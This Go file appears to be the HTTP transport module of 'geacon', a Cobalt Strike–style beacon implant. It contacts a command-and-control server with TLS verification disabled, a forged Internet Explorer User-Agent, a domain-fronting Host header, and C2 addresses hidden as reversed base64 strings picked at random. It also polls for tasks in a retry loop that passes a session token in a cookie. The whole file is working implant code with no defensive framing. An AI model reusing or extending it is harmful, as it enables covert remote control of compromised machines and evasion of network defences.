package packet

import (
	"geacon/cmd/config"
	"net/http"
	// "fmt"
	"github.com/imroc/req"
	"encoding/base64"
	"fmt"
	"math/rand"
	"time"
	"strings"
)

var (
	httpRequest = req.New()
)

func init(){
	httpRequest.EnableInsecureTLS(true)
}



func random(min, max int) int {
	rand.Seed(time.Now().Unix())
	return rand.Intn(max-min) + min
}

func reverse(str string) string {
	var result string
	strLen := len(str)
	for i := 0; i < strLen; i++ {
		result = result + fmt.Sprintf("%c", str[strLen-i-1])
	}
	return result
}

func getOneIP() string{

	ipArray := config.C4

	i := random(1, len(ipArray))
	sDec, err := base64.StdEncoding.DecodeString(reverse(ipArray[i]))
	if err != nil {
		fmt.Printf("Error decoding string: %s ", err.Error())
		return "127.0.0.1"
	}
	return string(sDec)
}

//TODO c2profile
func HttpPost(url string, data []byte) *req.Resp {

	httpHeaders := req.Header{
		"User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)",
		"Accept":     "*/*",
		"Host":     config.C3,
	}
	// fmt.Println(strings.ReplaceAll(url,"www.aliyun.com",getOneIP()))
	resp, err := httpRequest.Post(strings.ReplaceAll(url,config.C2,getOneIP()), data, httpHeaders)
	// fmt.Println(resp)
	// fmt.Println(err)
	if err != nil {
		panic(err)
	}
	if resp.Response().StatusCode == http.StatusOK {
		return resp
	}
	return nil
}
func HttpGet(url string, cookies string) *req.Resp {

	httpHeaders := req.Header{
		"User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)",
		"Accept":     "*/*",
		"Host":     config.C3,
		"Cookie":     "token=" + cookies,
	}

	for {

		resp, err := httpRequest.Get(strings.ReplaceAll(url,config.C2,getOneIP()), httpHeaders)
		// fmt.Println(resp)
		// fmt.Println(err)
		if err != nil {
			time.Sleep(config.WaitTime)
			continue
			//panic(err)
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket

				return resp
			}
			break
		}
	}
	return nil

}
